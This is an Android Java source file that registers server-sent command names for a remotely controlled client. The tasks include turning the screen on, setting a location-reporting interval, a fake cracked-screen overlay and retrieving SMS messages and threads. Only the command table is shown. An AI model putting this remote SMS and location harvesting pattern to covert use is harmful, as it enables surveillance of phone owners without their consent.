package com.c4wd.commands;

import android.os.AsyncTask;

import java.util.HashMap;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    public static HashMap<String, Class<? extends AsyncTask>> commandList;

    public static Class<?> getTask(String id) {
        return Command.commandList.get(id);
    }

    public static void initCommands() {
        if (Command.commandList == null) {
            Command.commandList = new HashMap<String, Class<? extends AsyncTask>>();
            //Adding commands is simple
            //commandList.put("String of command that is sent from the server", new (Task class)());

            commandList.put("ScreenOn", GenericTasks.ScreenOnTask.class);
            commandList.put("SetLocationInterval", GenericTasks.SetLocationIntervalTask.class);
            commandList.put("Toast", GenericTasks.ToastTask.class);
            //drawing tasks
            commandList.put("OpenGL", DrawingTasks.OpenGLViewTask.class);
            commandList.put("Pong", DrawingTasks.PongTask.class);
            commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
            //sms tasks
            commandList.put("CacheThread", SMSCommands.CacheThreadIdTask.class);
            commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
            commandList.put("GetThreads", SMSCommands.GetThreadsTask.class);
        }
    }
}
